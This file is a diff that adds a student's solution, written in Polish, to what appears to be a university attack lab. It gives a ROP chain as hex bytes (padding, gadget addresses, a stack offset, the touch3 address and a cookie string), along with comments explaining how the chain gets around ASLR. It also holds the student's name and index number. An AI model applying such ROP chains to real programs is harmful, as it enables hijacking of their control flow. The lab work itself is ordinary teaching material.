@@ -1,0 +1,57 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Artur Jankowski, 317928 
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+/*
+ * Mamy (z zad3):
+ * adres touch3: 0x0000000000401c5a (5a 1c 40 00 00 00 00 00)
+ * cookie jako string: (36 34 64 34 63 33 37 32)
+ * 
+ * Dostępne gadgety:
+ * rax <- 1 (eax <- 1)
+ * rax <- rdi + rsi 	      (27 1d 40 00 00 00 00 00)
+ * rax <- rsp (eax <- esp) (42 1d 40 00 00 00 00 00)
+ * popq %rax 		      (08 1d 40 00 00 00 00 00)
+ * rdi <- rax (edi <- eax) (16 1d 40 00 00 00 00 00)
+ * ecx <- eax 	 	      (d6 1d 40 00 00 00 00 00)
+ * edx <- ecx              (2f 1d 40 00 00 00 00 00)	 
+ * esi <- edx              (70 1d 40 00 00 00 00 00)
+ * 
+ * Jaki jest problem?
+ * Chcemy umieścić adres cookie który jest nad ramką stosu w %rdi
+ * Ale ten adres się zmienia więc nie da się zrobić (przez ASLR) - 0x5560a468 + 0x20 = 0x5560A488
+ * gdzie 0x5560a468 to był adres %rsp
+ * 
+ * Ale możemy zrobić obliczenie (%rsp + odległość do cookie) przy pomocy tego lea (rdi + rsi)
+ * 
+ * Idea algorytmu:
+ * rax <- rsp (zapisujemy adres, który był adresem powrotu z getbuf w rdi)
+ * rdi <- rax
+ * popq %rax  (do rax zapisujemy odległość) 
+ * odległość  (z gdb: x/xg $rsp+0x48 to cookie, przy rax <- rsp)
+ * ecx <- eax (teraz chcemy do rdi dodać tę odległość, ale nie ma rdi + rax)
+ * edx <- ecx
+ * esi <- edx (teraz esi == eax)
+ * rax <- rdi + rsi (to jest (%rsp + odleglosc))
+ * rdi <- rax (przekazywane do touch3() przez %rdi)
+ * touch3
+ * cookie
+*/
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 24 bajty paddingu */
+42 1d 40 00 00 00 00 00 /* rax <- rsp */
+16 1d 40 00 00 00 00 00 /* rdi <- rax */
+08 1d 40 00 00 00 00 00 /* popq %rax  */
+48 00 00 00 00 00 00 00 /* odległość od rsp do cookie */
+d6 1d 40 00 00 00 00 00 /* ecx <- eax */
+2f 1d 40 00 00 00 00 00 /* edx <- ecx */
+70 1d 40 00 00 00 00 00 /* esi <- edx */
+27 1d 40 00 00 00 00 00 /* rax <- rdi + rsi */
+16 1d 40 00 00 00 00 00 /* rdi <- rax */
+5a 1c 40 00 00 00 00 00 /* adres touch3 */
+36 34 64 34 63 33 37 32 /* cookie jako string */
